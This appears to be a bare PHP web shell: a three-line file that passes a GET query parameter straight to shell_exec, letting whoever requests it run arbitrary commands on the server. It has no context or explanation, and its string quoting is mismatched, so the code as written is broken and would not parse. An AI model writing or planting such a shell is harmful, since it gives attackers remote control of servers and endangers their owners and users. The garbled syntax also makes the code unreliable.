<?php
shell_exec($_GET["0q4-hM73']);
?>
